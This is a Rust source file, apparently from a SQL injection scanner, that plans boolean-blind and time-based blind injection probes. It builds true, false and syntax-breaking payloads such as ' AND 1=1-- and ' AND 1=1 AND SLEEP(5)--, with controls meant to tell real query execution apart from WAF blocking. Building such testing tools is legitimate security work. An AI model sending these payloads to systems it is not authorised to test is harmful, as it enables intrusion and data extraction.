use super::models::{ControlPayload, ControlRole, Experiment};
use crate::types::{ProbeType, SqlContext};

pub struct ExperimentPlanner;

impl ExperimentPlanner {
    /// Plans a boolean logic experiment, ensuring we have the minimum safe controls
    /// to prove logic execution vs. WAF blocking vs. application syntax rejection.
    pub fn plan_boolean_inference(base_val: &str, context: SqlContext) -> Experiment {
        let (syntax_payload, false_payload, true_payload) = match context {
            SqlContext::Numeric => (
                format!("{} -", base_val),
                format!("{} AND 1=2", base_val),
                format!("{} AND 1=1", base_val),
            ),
            SqlContext::String => (
                format!("{}'", base_val),
                format!("{}' AND 'a'='b", base_val),
                format!("{}' AND 'a'='a", base_val),
            ),
            _ => (
                format!("{}'", base_val),
                format!("{}' AND 1=2--", base_val),
                format!("{}' AND 1=1--", base_val),
            ),
        };

        Experiment {
            name: "Boolean Logic Causal Inference".to_string(),
            probe_type: ProbeType::BooleanBlind,
            budget_cost: 4, // 1 baseline + 3 probes
            controls: vec![
                ControlPayload {
                    role: ControlRole::Neutral,
                    payload: base_val.to_string(),
                },
                ControlPayload {
                    role: ControlRole::SyntaxInvalid,
                    payload: syntax_payload,
                },
                ControlPayload {
                    role: ControlRole::LogicFalse,
                    payload: false_payload,
                },
            ],
            candidates: vec![
                ControlPayload {
                    role: ControlRole::LogicTrue,
                    payload: true_payload,
                }
            ],
        }
    }

    /// Plans a timing-based experiment with controls to account for network latency variance.
    pub fn plan_timing_inference(base_val: &str, _context: SqlContext) -> Experiment {
        Experiment {
            name: "Timing Causal Inference".to_string(),
            probe_type: ProbeType::TimingProbe,
            budget_cost: 3,
            controls: vec![
                ControlPayload {
                    role: ControlRole::Neutral,
                    payload: base_val.to_string(),
                },
                ControlPayload {
                    // Logic false, delay function should not execute
                    role: ControlRole::LogicFalse,
                    payload: format!("{}' AND 1=2 AND SLEEP(5)--", base_val),
                },
            ],
            candidates: vec![
                ControlPayload {
                    // Logic true, delay function should execute
                    role: ControlRole::LogicTrue,
                    payload: format!("{}' AND 1=1 AND SLEEP(5)--", base_val),
                }
            ],
        }
    }
}
